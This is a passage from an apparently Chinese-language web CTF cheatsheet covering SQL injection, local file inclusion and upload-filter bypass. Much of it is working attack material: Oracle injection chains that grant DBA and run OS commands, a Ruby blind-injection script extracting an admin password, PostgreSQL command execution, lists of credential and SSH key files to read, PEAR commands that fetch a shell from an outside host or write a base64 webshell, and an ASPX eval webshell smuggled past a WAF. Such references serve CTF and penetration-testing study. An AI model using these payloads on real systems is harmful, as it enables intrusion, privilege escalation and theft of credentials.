        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual
        -- 建立java command
        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual
        -- 賦予java執行權限
        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
        -- 創建函數
        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
        -- 賦予函數執行權限
        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual
        -- 執行指令
        select sys.cmd('cmd.exe /c whoami') from dual
        ```
    - `dbms_xmlquery.newcontext`
        - 執行多語句
        - 影響版本: oracle 10g, 11g 等，高版本已修復
        ```sql
        select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;

        select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;

        select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';

        select LINXRUNCMD('whoami') from dual;
        ```
- 特殊用法
    - `DBMS_XMLGEN.getXML('select user from dual')`

## SQLite

- 子字串：
    - `substr(“abc",1,1)   =>   'a'`
- Ascii function:
    - `unicode('d') => 100`
- legth
    - `length('ab') => 2`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'` 
- Time Delay
    - `randomblob(100000000)`
- 空白字元
    - `0A 0D 0C 09 20`
- Case when
    - SQLite 沒有 `if`
    - 可以用 `Case When ... Then ...` 代替
    - `case when (條件) then ... else ... end`
- 註解
    - `--`
- 爆表名
    - `SELECT name FROM sqlite_master WHERE type='table'`
- 爆表結構(含 Column)
    - `SELECT sql FROM sqlite_master WHERE type='table'`
- 其他
    - `sqlite_version()`
    - sqlite 無法使用 `\'` 跳脫單引號
    - `[]` 神奇用法
        - `CREATE TABLE a AS SELECT sql [ some shit... ]FROM sqlite_master;`
            - CREATE TABLE 後面也能接 SELECT condition
        - [zer0pts CTF 2020 - phpNantokaAdmin](https://github.com/w181496/CTF/tree/master/zer0pts2020/phpNantokaAdmin)
- Boolean Based: SECCON 2017 qual SqlSRF

<details>
    <summary><b>Click here to view script</b></summary>

```ruby
# encoding: UTF-8

# sqlite injection (POST method) (二分搜)
# SECCON sqlsrf爆admin密碼 
require 'net/http'
require 'uri'

$url = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'
$ans = ''

(1..100).each do |i|
    l = 48
    r = 122

    while(l <= r)
        #puts "left: #{l}, right: #{r}"
        break if l == r

        mid = ((l + r) / 2)
        $query = "kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') > #{mid} and '1'='1"
        
        res = Net::HTTP.post_form URI($url), {"user" => $query, "pass" => "kaibro", "login" => "Login"}
        
        if res.body.include? 'document.location'
            l = mid + 1
        else
            r = mid
        end

    end
    $ans += l.chr
    puts $ans

end

```

</details>

## PostgreSQL

- 子字串
    - `substr("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('x') => 120`
- Char function
    - `chr(65) => A`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'`
- Delay function
    - `pg_sleep(5)`
    - `GENERATE_SERIES(1, 1000000)`
    - `repeat('a', 10000000)`
- 空白字元
    - `0A 0D 0C 09 20`
- encode / decode
    - `encode('123\\000\\001', 'base64')` => `MTIzAAE=`
    - `decode('MTIzAAE=', 'base64')` => `123\000\001`
- 不支援limit N, M
    - `limit a offset b` 略過前 b 筆，抓出 a 筆出來
- 註解
    - `--`
    - `/**/`
- $$ 取代引號
    - `SELECT $$This is a string$$`
- 爆庫名
    - `SELECT datname FROM pg_database`
- 爆表名
    - `SELECT tablename FROM pg_tables WHERE schemaname='dbname'`
- 爆Column
    - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
- Dump all 
    - `array_to_string(array(select userid||':'||password from users),',')`
- 列舉 privilege
    - `SELECT * FROM pg_roles;`
- 列舉用戶 hash
    - `SELECT usename, passwd FROM pg_shadow`
- RCE
    - CVE-2019–9193
        - 在 9.3 版本實作了 `COPY TO/FROM PROGRAM`
        - 版本 9.3 ~ 11.2 預設啟用
        - 讓 super user 和任何在 `pg_read_server_files` 群組的 user 可以執行任意指令
        - 方法
            - `DROP TABLE IF EXISTS cmd_exec;`
            - `CREATE TABLE cmd_exec(cmd_output text);`
            - `COPY cmd_exec FROM PROGRAM 'id';`
            - `SELECT * FROM cmd_exec;`
    - 版本 8.2 以前
        - `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;`
        - `select system('id');`
    - UDF
        - sqlmap udf: https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql
        - `CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;`
        - `SELECT sys_eval("id");`
- 其它
    - version()
    - current\_database()
    - user
        - current_user
        - `SELECT usename FROM pg_user;`
    - getpgusername()
    - current\_schema
    - current\_query()
    - inet\_server\_addr()
    - inet\_server\_port()
    - inet\_client\_addr()
    - inet\_client\_port()
    - type conversion
        - `cast(count(*) as text)`
    - `md5('abc')`
    - `replace('abcdefabcdef', 'cd', 'XX')` => `abXXefabXXef`
    - `pg_read_file(filename, offset, length)`
        - 讀檔
        - 只能讀 data_directory 下的
    - `pg_ls_dir(dirname)`
        - 列目錄內容
        - 只能列 data_directory 下的
    - PHP 的 `pg_query()` 可以多語句執行
    - `lo_import()`, `lo_get()` 讀檔
        - `select cast(lo_import('/var/lib/postgresql/data/secret') as text)` => `18440`
        - `select cast(lo_get(18440) as text)` => `secret_here`

## MS Access

- 沒有註解
    - 某些情況可以用 `%00`, `%16` 來達到類似效果
- 沒有 Stacked Queries
- 沒有 Limit
    - 可以用 `TOP`, `LAST` 取代
    - `'UNION SELECT TOP 5 xxx FROM yyy%00`
- 沒有 Sleep, Benchmark, ...
- 支援 Subquery
    - `'AND (SELECT TOP 1 'xxx' FROM table)%00`
- 在 subquery 或 Union select 時，需要指定 `FROM` 
- String Concatenation
    - `&` (`%26`)
    - `+` (`%2B`)
    - `'UNION SELECT 'aa' %2b 'bb' FROM table%00`
- Ascii Function
    - `ASC()`
    - `'UNION SELECT ASC('A') FROM table%00`
- Substring Function
    - `Mid()`
    - `Mid('admin',1,1)`
- IF THEN
    - `IFF(condition, true, false)`
    - `'UNION SELECT IFF(1=1, 'a', 'b') FROM table%00`
- Ref
    - https://book.hacktricks.xyz/pentesting-web/sql-injection/ms-access-sql-injection

## ORM injection


- Hibernate
    - 不支援 UNION 語法
    - 單引號跳脫法
        - MySQL 中，單引號用 `\'` 跳脫
        - HQL 中，用兩個單引號 `''` 跳脫
        - `'abc\''or 1=(SELECT 1)--'`
            - 在 HQL 是一個字串
            - 在 MySQL 是字串+額外 SQL 語句
    - Magic Function 法
        - PostgreSQL 中內建 `query_to_xml('Arbitary SQL')`
        - Oracle 中有 `dbms_xmlgen.getxml('SQL')`
    - Java Constants
        - 可以從 classpath 中去找 constant 來用
        - 例如 `ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR` 在 MySQL 層就會被解成單引號 (在 HQL 層則不是)
        - Example: DEVCORE Wargame 2024 - Spring
            - `/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE and '-- '='a`
                - HQL: 等同 `/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE and '[shit]'='a`
                - MySQL: 等同 `/a'*length('a')*'[shit]'-- [shit]`
        - 常見 Constants:
            - `org.apache.batik.util.XMLConstants.XML_CHAR_APOS`
            - `com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE`
            - `jodd.util.StringPool.SINGLE_QUOTE`
            - `ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR`
            - `cz.vutbr.web.csskit.OutputUtil.STRING_OPENING`
            - `com.sun.java.help.impl.DocPConst.QUOTE`
            - `org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE`
            - `org.apache.logging.log4j.util.Chars.QUOTE`
    - Reference
        - https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications
        - https://www.slideshare.net/slideshow/new-methods-for-exploiting-orm-injections-in-java-applications/62514298

HQL injection example (pwn2win 2017)

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "flag": No such file or directory`

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "secret": No such file or directory`
- `order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)`
    - Output: `ERROR: could not stat file "CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}": No such file or directory`


## SQL Injection with MD5

- `$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";`
- ffifdyop
    - md5: `276f722736c95d99e921722cf9ed621c`
    - to string: `'or'6<trash>`

## HTTP Parameter Pollution

- `id=1&id=2&id=3`
    - ASP.NET + IIS: `id=1,2,3`
    - ASP + IIS: `id=1,2,3`
    - PHP + Apache: `id=3`

## SQLmap

- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- Usage
    - `python sqlmap.py -u 'test.kaibro.tw/a.php?id=1'`
        - 庫名: `--dbs`
        - 表名: `-D dbname --tables`
        - column: `-D dbname -T tbname --columns`
        - dump: `-D dbname -T tbname --dump`
            - `--start=1`
            - `--stop=5566`
        - DBA? `--is-dba`
        - 爆帳密: `--passwords`
        - 看權限: `--privileges`
        - 拿shell: `--os-shell`
        - interative SQL: `--sql-shell`
        - 讀檔: `--file-read=/etc/passwd`
        - Delay時間: `--time-sec=10`
        - User-Agent: `--random-agent`
        - Thread: `--threads=10`
        - Level: `--level=3`
            - default: 1
        - `--technique`
            - default: `BEUSTQ`
        - Cookie: `--cookie="abc=55667788"`
        - Tor: `--tor --check-tor --tor-type=SOCKS5 --tor-port=9050`

# LFI

## Testing Payload

### Linux / Unix

- Common Payload
    - `./index.php`
    - `././index.php`
    - `.//index.php`
    - `../../../../../../etc/passwd`
    - `../../../../../../etc/passwd%00`
        - 僅在 5.3.0 以下可用
        - magic_quotes_gpc 需為OFF
    - `....//....//....//....//etc/passwd`
    - `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
    - `%252e/%252e/etc/passwd`
    - `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
    - `.+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd`
    - `static\..\..\..\..\..\..\..\..\etc\passwd`
    
- Config
    - `/usr/local/apache2/conf/httpd.conf`
    - `/usr/local/etc/apache2/httpd.conf`
    - `/usr/local/nginx/conf/nginx.conf`
    - `/etc/apache2/sites-available/000-default.conf`
    - `/etc/apache2/apache2.conf`
    - `/etc/apache2/httpd.conf`
    - `/etc/httpd/conf/httpd.conf`
    - `/etc/nginx/conf.d/default.conf`
    - `/etc/nginx/nginx.conf`
    - `/etc/nginx/sites-enabled/default`
    - `/etc/nginx/sites-enabled/default.conf`
    - `/etc/mysql/my.cnf`
    - `/etc/resolv.conf`
    - `/etc/named.conf`
    - `/etc/rsyslog.conf`
    - `/etc/samba/smb.conf`
    - `/etc/openldap/slapd.conf`
    - `/etc/mongod.conf`
    - `/etc/krb5.conf`
    - `~/.tmux.conf`
    - `~/.mongorc.js`
    - `$TOMCAT_HOME/conf/tomcat-users.xml`
    - `$TOMCAT_HOME/conf/server.xml`

- Log
    - `/var/log/apache2/error.log`
    - `/var/log/httpd/access_log`
    - `/var/log/mail.log`
    - `/var/log/auth.log`
    - `/var/log/messages`
    - `/var/log/secure`
    - `/var/log/sshd.log`
    - `/var/log/mysqld.log`
    - `/var/log/mongodb/mongod.log`
    - `.pm2/pm2.log`
    - `$TOMCAT_HOME/logs/catalina.out`

- History
    - `.history`
    - `.bash_history`
    - `.sh_history`
    - `.zsh_history`
    - `.viminfo`
    - `.php_history`
    - `.mysql_history`
    - `.dbshell`
    - `.histfile`
    - `.node_repl_history`
    - `.python_history`
    - `.scapy_history`
    - `.sqlite_history`
    - `.psql_history`
    - `.rediscli_history`
    - `.coffee_history`
    - `.lesshst`
    - `.wget-hsts`
    - `.config/fish/fish_history`
    - `.local/share/fish/fish_history`
    - `.ipython/profile_default/history.sqlite`

- 其他
    - `/proc/self/cmdline`
    - `/proc/self/fd/[0-9]*`
    - `/proc/self/environ`
    - `/proc/net/fib_trie`
    - `/proc/mounts`
    - `/proc/net/arp`
    - `/proc/net/tcp`
    - `/proc/sched_debug`
    - `.htaccess`
    - `~/.bashrc`
    - `~/.bash_profile`
    - `~/.bash_logout`
    - `~/.zshrc`
    - `~/.aws/config`
    - `~/.aws/credentials`
    - `~/.boto`
    - `~/.s3cfg`
    - `~/.gitconfig`
    - `~/.config/git/config`
    - `~/.git-credentials`
    - `~/.env`
    - `/etc/passwd`
    - `/etc/shadow`
    - `/etc/hosts`
    - `/etc/rc.d/rc.local`
    - `/etc/boto.cfg`
    - `/root/.ssh/id_rsa`
    - `/root/.ssh/authorized_keys`
    - `/root/.ssh/known_hosts`
    - `/root/.ssh/config`
    - `/etc/sysconfig/network-scripts/ifcfg-eth0`
    - `/etc/exports`
    - `/etc/crontab`
    - `/var/spool/cron/root`
    - `/var/spool/cron/crontabs/root`
    - `/var/mail/<username>`


### Windows

- `C:/Windows/win.ini`
- `C:/boot.ini`
- `C:/apache/logs/access.log`
- `../../../../../../../../../boot.ini/.......................`
- `C:\Windows\System32\drivers\etc\hosts`
- `C:\WINDOWS\System32\Config\SAM`
- `C:/WINDOWS/repair/sam`
- `C:/WINDOWS/repair/system`
- `%SYSTEMROOT%\System32\config\RegBack\SAM`
- `%SYSTEMROOT%\System32\config\RegBack\system`
- `%WINDIR%\system32\config\AppEvent.Evt`
- `%WINDIR%\system32\config\SecEvent.Evt`
- `%WINDIR%\iis[version].log`
- `%WINDIR%\debug\NetSetup.log`
- `%SYSTEMDRIVE%\autoexec.bat`
- `C:\Documents and Settings\All Users\Application Data\Git\config`
- `C:\ProgramData\Git\config`
- `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- `C:\inetpub\temp\appPools\DefaultAppPool\DefaultAppPool.config`
- `C:\Windows\System32\inetsrv\config\ApplicationHost.config`
- `C:\WINDOWS\debug\NetSetup.log`
- `C:\WINDOWS\pfro.log`
- `C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config`

## 環境變數

- `../../../../proc/self/environ`
    - HTTP_User_Agent塞php script

## php://filter

- `php://filter/convert.base64-encode/resource=index.php`
- `php://filter/convert.base64-decode/resource=index.php`
- `php://filter/read=string.rot13/resource=index.php`
- `php://filter/zlib.deflate/resource=index.php`
- `php://filter/zlib.inflate/resource=index.php`
- `php://filter/convert.quoted-printable-encode/resource=index.php`
- `php://filter/read=string.strip_tags/resource=php://input`
- `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php`
- `php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php`
- ...
- 進階玩法
    - LFI RCE without controlling any file: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
    - Memory Limit Oracle to read local file: https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py
    - Example:
        - [hxp ctf 2021 - includer's revenge](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
        - [CakeCTF 2022 - ImageSurfing](https://ptr-yudai.hatenablog.com/#ImageSurfing)
        - [DownUnderCTF 2022 - minimal-php](https://github.com/DownUnderCTF/Challenges_2022_Public/tree/main/web/minimal-php)
        - [blaklisctf - chall3](https://twitter.com/Blaklis_/status/1625918537813446656)
        - [HITCON CTF 2022 - web2pdf](https://blog.splitline.tw/hitcon-ctf-2022/)
        - [N1CTF 2023 - laravel](https://ctftime.org/writeup/38034)
## php://input

- `?page=php://input`
    - post data: `<?php system("net user"); ?>`
    - 需要有開啟 `url_allow_include`，5.4.0 直接廢除

## phpinfo

- 對 server 以 form-data 上傳文件，會產生 tmp 檔
- 利用 phpinfo 得到 tmp 檔路徑和名稱
- LFI Get shell
- 限制
    - Ubuntu 17 後，預設開啟 `PrivateTmp`，無法利用

## php session

- Session 一般存在 `sess_{PHPSESSID}` 中
- 可以透過修改 Cookie 再 LFI 拿 shell
- 以下為常見存放路徑
    - /var/tmp/
    - /tmp/
    - /var/lib/php5/
    - /var/lib/php/
    - C:\windows\temp\sess_<PHPSESSID>
        - windows
- `session.upload_progress`
    - PHP 預設開啟
    - 用來監控上傳檔案進度
    - 當 `session.upload_progress.enabled` 開啟，可以 POST 在 `$_SESSION` 中添加資料 (`sess_{PHPSESSID}`)
    - 配合 LFI 可以 getshell
    - `session.upload_progress.cleanup=on` 時，可以透過 Race condition
    - 上傳 zip
        - 開頭會有 `upload_progress_`，結尾也有多餘資料，導致上傳 zip 正常狀況無法解析
        - 利用 zip 格式鬆散特性，刪除前 16 bytes 或是手動修正 EOCD 和 CDH 的 offset 後上傳，可以讓 php 正常解析 zip
    - Example
        - [HITCON CTF 2018 - One Line PHP Challenge](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
        - [0CTF 2021 Qual - 1linephp](https://github.com/w181496/CTF/tree/master/0ctf2021_qual/1linephp)

## PEAR

- 條件
    - 安裝 pear (pearcmd.php)
    - 有開 `register_argc_argv`
- 寫檔
    - 法一: `/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php`
    - 法二: `/?+-c+/tmp/shell.php+-d+man_dir=<?phpinfo();?>/*+-s+list&file=/usr/local/lib/php/pearcmd.php`
    - 法三: `/?+download+https://kaibro.tw/shell.php+&fike=/usr/local/lib/php/pearcmd.php`
    - 法四: `/?+channel-discover+kaibro.tw/302.php?&file=/usr/local/lib/php/pearcmd.php`
        - 302.php 會跳轉到 test.php 做下載
- 安裝 package
    - `/?+install+--force+--installroot+/tmp/wtf+http://kaibro.tw/KaibroShell.tgz+?&file=/usr/local/lib/php/pearcmd.php`
- Command Injection
    - `/?+install+-R+&file=/usr/local/lib/php/pearcmd.php&+-R+/tmp/other+channel://pear.php.net/Archive_Tar-1.4.14`
    - `/?+bundle+-d+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/+/tmp/other/tmp/pear/download/Archive_Tar-1.4.14.tgz+&file=/usr/local/lib/php/pearcmd.php&`
    - `/?+svntag+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/Archive_Tar+&file=/usr/local/lib/php/pearcmd.php&`
- Command Injection 2
    - 不用寫檔、需要有 phpt file
    - `/?page=../usr/local/lib/php/peclcmd.php&+run-tests+-i+-r"system(hex2bin('PAYLOAD'));"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt`
- Example
    - [Balsn CTF 2021 - 2linephp](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#2linephp)
    - [巅峰极客2020 - MeowWorld](https://www.anquanke.com/post/id/218977#h2-3)
    - [SEETF 2023 - readonlt](https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2023/readonly/README.md)

## Nginx buffering

- 當 Request body 過大或是 fastcgi server response 過大，超過 buffer size 時，其內容會保存到暫存檔中 ([reference](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size))
    - 會在 `/var/lib/nginx/body/`, `/var/lib/nginx/fastcgi/` 下建立暫存檔
    - 但該暫存檔會馬上被刪除
    - 可以透過 `/proc/<nginx worker pid>/fd/<fd>` 來取得被刪除的檔案內容
        - php 的 `include()` 會將 fd 路徑解析成 `/var/lib/nginx/body/0000001337 (deleted)` 格式，導致引入失敗
        - 可以用以下方式繞過
            - `/proc/self/fd/34/../../../34/fd/15`
            - `/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/34/fd/15`

- Example
    - [hxp ctf 2021 - includer's revenge](https://hxp.io/blog/90/hxp%20CTF%202021:%20includer%27s%20revenge%20writeup/)
    - [hxp ctf 2021 - counter](https://hxp.io/blog/89/hxp-CTF-2021-counter-writeup/)

## data://

- 條件
    - allow_url_fopen: On
    - allow_url_include: On
- 用法
    - `?file=data://text/plain,<?php phpinfo()?>`
    - `?file=data:text/plain,<?php phpinfo()?>`
    - `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

## zip / phar

- 適用驗證副檔名時
- zip
    - 新建 zip，裡頭壓縮 php 腳本(可改副檔名)
    - `?file=zip://myzip.zip#php.jpg`
    - Example
        - [0CTF 2021 Qual - 1linephp](https://github.com/w181496/CTF/tree/master/0ctf2021_qual/1linephp)
- phar
    - ```php
        <?php
            $p = new PharData(dirname(__FILE__).'/phartest.zip',0,'phartest2',Phar::ZIP);
            $x = file_get_contents('./a.php');
            $p->addFromString('b.jpg', $x);
        ?>
    - 構造 `?file=phar://phartest.zip/b.jpg`

## SSI (Server Side Includes)

- 通常放在`.shtml`, `.shtm`, `.stm`
- Execute Command
    - `<!--#exec cmd="command"-->`
- File Include
    - `<!--#include file="../../web.config"-->`
- Example
    - [HITCON CTF 2018 - Why so Serials?](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
    - [Hack.lu 2019 - Trees For Future](https://w0y.at/writeup/2019/10/28/hacklu-2019-trees-for-future.html)

# 上傳漏洞

## Javascript檢測

- Burp Suite 中間修改
- disable javascript

## Bypass MIME Detection

- Burp修改Content-Type

## 黑名單判斷副檔名

- 大小寫繞過
    - pHP
    - AsP 
- 空格 / 點 / Null 繞過
    - Windows特性
    - .php(空格)  // burp修改
    - .asp.
    - .php%00.jpg
- php3457
    - .php3
    - .php4
    - .php5
    - .php7
    - .pht
    - .phtml
- asp
    - asa
    - cer
    - cdx
- aspx
    - ascx
    - ashx
    - asmx
    - asac
    - soap
    - svc
    - master
    - web.config
- jsp
    - jspa
    - jspf
    - jspx
    - jsw
    - jsv
    - jhtml
- .htaccess
    - set handler
    ```
    <FilesMatch "kai">
    SetHandler application/x-httpd-php
    </FilesMatch>
    ```
    - read file 
      - `ErrorDocument 404 %{file:/etc/passwd}`
      - `redirect permanent "/%{BASE64:%{FILE:/etc/passwd}}"`
      - Example: [Real World CTF 4th - RWDN](https://r3kapig.com/writeup/20220125-rwctf4/#rwdn)

- .user.ini
    - 只要 fastcgi 運行的 php 都適用 (nginx/apache/iis)
    - 用戶自定義的設定檔
        - 可以設置 `PHP_INI_PERDIR` 和 `PHP_INI_USER` 的設定
        - 可以動態載入，不用重啟
    - 使用前提: 該目錄下必須有 php 文件
    - `auto_prepend_file=test.jpg`
- 文件解析漏洞
- NTFS ADS
    - `test.php:a.jpg`
        - 生成 `test.php`
        - 空內容
    - `test.php::$DATA`
        - 生成 `test.php`
        - 內容不變
    - `test.php::$INDEX_ALLOCATION`
        - 生成 `test.php` 資料夾
    - `test.php::$DATA.jpg`
        - 生成 `0.jpg`
        - 內容不變
    - `test.php::$DATA\aaa.jpg`
        - 生成 `aaa.jpg`
        - 內容不變

## Magic Number

- jpg
    - `FF D8 FF E0 00 10 4A 46 49 46`
- gif
    - `47 49 36 38 39 61`
- png
    - `89 50 4E 47`

## 繞 WAF

### Content-Disposition / filename / Form header

- Java (commons-fileupload)
    - `filename` 前後塞 `%20`, `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%1c`, `%1d`, `%1e`, `%1f`
        - e.g. `Content-Disposition: form-data; name="file"; %1cfilename%0a="shell.jsp"`
    - Quotable-Printable(QP) / Base64 編碼
        - `Content-Disposition: form-data; name="file"; filename="=?UTF-8?B?c2hlbGwuanNw?="`
        - `Content-Disposition: form-data; name="file"; filename="=?UTF-8?Q?=73=68=65=6c=6c=2e=6a=73=70?="`
    - Spring filename 編碼特性
        - `Content-Disposition: form-data; name="file"; filename*="1.jsp"`
        - `Content-Disposition: form-data; name="file"; filename*="UTF-8'1.jpg'1.jsp"`
        - `Content-Disposition: form-data; name="file"; filename*="UTF-8'1.jpg'=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?="`
- .NET (context.Request.files)
    - 抓上傳檔名只匹配 `Content-Disposition:` 後的 `filename=xxx`
    - `Content-Disposition:name="file"kaibrokaibrofilename=shell.aspx`
- 不一致
    - `filename=a.php; filename*=UTF-8''a`
        - php: `a.php`
        - golang: `a`
        - Example: Codegate 2024 - Cha's Wall
- Form header confusion
    - `x=filename="1;/../shell.aspx";`
        - WAF 視角: `x=filenmae="1;`
        - 後端視角: `filename="1;/../shell.aspx"`
- Content-Type confusion
```
Content-Type: application/x-www-form-urlencoded; multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="query";
Content-Type: image/jpeg&action=search&query=aaa'or''='

meow
--x--
```

### Boundary

Null Byte:

```
Content-Type: multipart/form-data; boundary=x

--x\0
Content-Disposition: form-data; name="path";

../../../../etc/passwd
--x\0
```

--

Double Boundary (前後端解析不一致):

```
Content-Type: multipart/form-data; BOUNDARY=y; boundary=x; 

--x
Content-Disposition: form-data; name="test";
Content-Type: text/plain

--y
Content-Disposition: form-data; name="msg";
Content-Type: text/plain

1
--y--
--x--
```
(後端吃y, WAF吃x)

--

Combo (Double Boundary + Form header confusion + Content-type mutation):

```
Content-Type: multipart/form-data; BOUNDARY=y:; boundary=x; 

--x
Content-Disposition: form-data; name="x";

1
--x
--y:
Content-Disposition: form-data; name="file"; x=filename="1;/../shell.aspx";


--x
Content-Disposition: form-data; name="foo";
Content-Type: <%@ Page Language="JScript"%><%eval(Request.Item["x"],"unsafe");%>

--y:--
--x--
```

## 暫存檔案

- PHP
    - PHP 在上傳時，會在臨時目錄下生成臨時文件
    - Linux: `phpXXXXXX`
    - Windows: `phpXXXXXX.tmp`
    - 可以透過 phpinfo 取得暫存檔名，並結合 LFI 達到 RCE: [reference](https://github.com/w181496/Web-CTF-Cheatsheet#phpinfo)
- Tomcat
    - `curl http://127.0.0.1:8080/ -H "Cookie: JSESSIONID=910666EC33F0B928D05C3C277397DBC5" --limit-rate 1K -F "files=@payload" -X GET`
    - `/tmp/tomcat.8080.15601954988790012368/work/Tomcat/localhost/ROOT`
    - Example: 
        - RealWorld CTF 2024 - chatterbox
- Rack
    - `curl -F file=@hello.txt http://127.0.0.1:3000/`
    - 會暫存目錄，生成 `RackMultipart20250103-1-sc3f98.txt` (6 bytes 隨機)
    - Example
        - [SekaiCTF 2023 - Scanner Service](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#scanner-service-146-solves)
- Nginx Buffering
    - https://github.com/w181496/Web-CTF-Cheatsheet#nginx-buffering
- 通常都可以透過 `/proc/self/fd/xxx` link 到暫存檔案

## 其他

- 常見場景：配合文件解析漏洞
- 超長檔名截斷

